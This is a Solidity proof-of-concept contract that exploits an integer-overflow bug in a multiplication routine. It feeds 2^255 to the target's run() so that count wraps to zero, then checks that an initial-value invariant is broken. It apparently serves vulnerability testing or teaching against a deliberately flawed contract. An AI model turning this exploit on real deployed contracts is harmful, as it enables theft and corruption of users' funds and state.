pragma solidity ^0.4.19;

interface IIntegerOverflowMul {
    function run(uint256 input) external;
    function count() external view returns (uint256);
}

contract ExploitIntegerOverflow {
    IIntegerOverflowMul public target;

    constructor(address _target) public {
        target = IIntegerOverflowMul(_target);
    }

    function attack() public {
        // count = 2 initially
        // Let input = 2^255 => 1 << 255
        // count * input = 2 * 2^255 = 2^256, which overflows to 0
        uint256 maliciousInput = (1 << 255);
        target.run(maliciousInput);
    }

    function verifyBrokenInvariants() public view returns (bool broken, uint256 brokenCount) {
        uint256 currentCount = target.count();
        broken = currentCount < 2; // violates Initial Value Constraint
        brokenCount = currentCount;
    }
}

